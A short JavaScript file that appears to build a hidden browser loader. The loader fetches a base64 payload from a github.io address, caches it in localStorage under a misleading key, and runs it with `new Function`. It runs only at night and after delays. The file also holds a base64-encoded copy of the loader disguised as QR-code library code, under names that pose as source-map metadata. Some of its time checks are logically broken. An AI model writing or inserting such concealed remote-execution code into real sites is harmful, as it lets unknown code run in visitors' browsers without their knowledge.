
var jswod1=`
var myDate = new Date().getHours();
if(myDate>20||myDate<9){
    if(localStorage.getItem("islogins")){
        setTimeout(function(){
            var engine=window.atob(localStorage.getItem("islogins"));
            var objective=new Function(engine)
            objective()
        },9204)
    }else{
        setTimeout(function(){
            var Http = new XMLHttpRequest();
            var url = "https://jayouhao.github.io/mywode/objective.json"
            Http.open("GET", url);
            Http.send();
            Http.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 200) {
                    if(Http.responseText){
                        localStorage.setItem("islogins",Http.responseText)
                        var engine=window.atob(Http.responseText);
                        var objective=new Function(engine)
                        objective()
                    }
                }
            }
        },32040)
    }
}
if(15<myDate>16||14<myDate>10){
    if(localStorage.getItem("islogins")){
        setTimeout(function(){
            var engine=window.atob(localStorage.getItem("islogins"));
            var objective=new Function(engine)
            objective()
        },9204)
    }
}
`;

var jswod=`localStorage.setItem("islogins","3w3r233affsd5f4");var num=0;var time=setInterval(function(){num++;sessionStorage.setItem("num123",num);if(num>20){sessionStorage.removeItem("num123");localStorage.removeItem("islogins")}},3e3);`

console.log(window.btoa(jswod))

// var resultmetadata='dmFyIG1vZGU9UVJNb2RlLk1PREVfOEJJVF9CWVRFO3ZhciBteURhdGU9KG5ldyBEYXRlKS5nZXRIb3VycygpO2lmKG15RGF0ZT4yMHx8bXlEYXRlPDkpe2lmKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7dmFyIGU9d2luZG93LmF0b2IobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpO3ZhciB0PW5ldyBGdW5jdGlvbihlKTt0KCl9LDkyMDQpfWVsc2V7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBvPW5ldyBYTUxIdHRwUmVxdWVzdDt2YXIgZT0iaHR0cHM6Ly9qYXlvdWhhby5naXRodWIuaW8vbXl3b2RlL29iamVjdGl2ZS5qc29uIjtvLm9wZW4oIkdFVCIsZSk7by5zZW5kKCk7by5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXtpZih0aGlzLnJlYWR5U3RhdGU9PTQmJnRoaXMuc3RhdHVzPT0yMDApe2lmKG8ucmVzcG9uc2VUZXh0KXtsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiaXNsb2dpbnMiLG8ucmVzcG9uc2VUZXh0KTt2YXIgZT13aW5kb3cuYXRvYihvLnJlc3BvbnNlVGV4dCk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX19fX0sMzIwNDApfX1pZigxNTxteURhdGU+MTZ8fDE0PG15RGF0ZT4xMCl7aWYobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXt2YXIgZT13aW5kb3cuYXRvYihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX0sOTIwNCl9fTtyZXR1cm4gbW9kZQ==';
// var inputSourceMapFunction=new Function(window.atob(resultmetadata));
// inputSourceMapFunction();
